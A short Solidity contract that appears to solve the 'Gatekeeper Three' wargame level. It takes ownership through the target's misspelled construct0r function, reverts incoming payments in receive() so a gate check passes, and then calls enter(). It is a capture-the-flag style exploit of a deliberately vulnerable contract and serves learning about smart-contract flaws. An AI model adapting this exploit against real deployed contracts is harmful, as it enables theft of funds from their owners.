// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./GatekeeperThree.sol";

contract GatekeeperThreeAttack is Ownable {
    GatekeeperThree public gatekeeperThree;

    constructor(address payable addr) {
        gatekeeperThree = GatekeeperThree(addr);
    }

    function attack() external onlyOwner {
        gatekeeperThree.construct0r();

        gatekeeperThree.enter();
    }

    receive() external payable {
        if (msg.sender == address(gatekeeperThree)) revert();
    }
}
